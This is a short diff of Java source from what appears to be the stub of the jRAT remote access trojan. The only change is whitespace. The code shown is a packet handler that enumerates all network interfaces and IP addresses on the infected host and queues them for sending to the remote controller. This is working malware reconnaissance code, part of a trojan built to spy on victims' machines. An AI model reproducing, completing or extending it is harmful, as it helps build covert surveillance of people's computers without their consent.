@@ -9,8 +9,6 @@ import java.util.Enumeration;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet56NetworkAdapter;
 
-
-
 public class Packet82NetworkAdapters extends AbstractIncomingPacket {
 
 	@Override
@@ -18,7 +16,7 @@ public class Packet82NetworkAdapters extends AbstractIncomingPacket {
 		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
 		for (NetworkInterface netint : Collections.list(nets)) {
 			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());
-			
+
 			Connection.addToSendQueue(new Packet56NetworkAdapter(netint.getDisplayName(), netint.getName(), list));
 		}
 	}
